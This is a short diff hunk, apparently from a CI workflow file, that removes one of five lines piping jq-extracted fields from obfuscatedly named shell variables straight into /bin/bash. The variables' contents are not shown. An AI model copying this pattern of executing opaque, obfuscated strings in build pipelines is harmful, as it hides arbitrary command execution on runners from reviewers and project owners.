@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$qz040" | jq -r .vgmhq94 | /bin/bash
           printf '%s' "$sqbfe39805" | jq -r .g48 | /bin/bash
           printf '%s' "$jen6" | jq -r .zn96 | /bin/bash
-          printf '%s' "$gq817" | jq -r .gqf41 | /bin/bash
           echo $lzq97 | jq -r .vjfvz5883 | /bin/bash
 
       - name: Save results
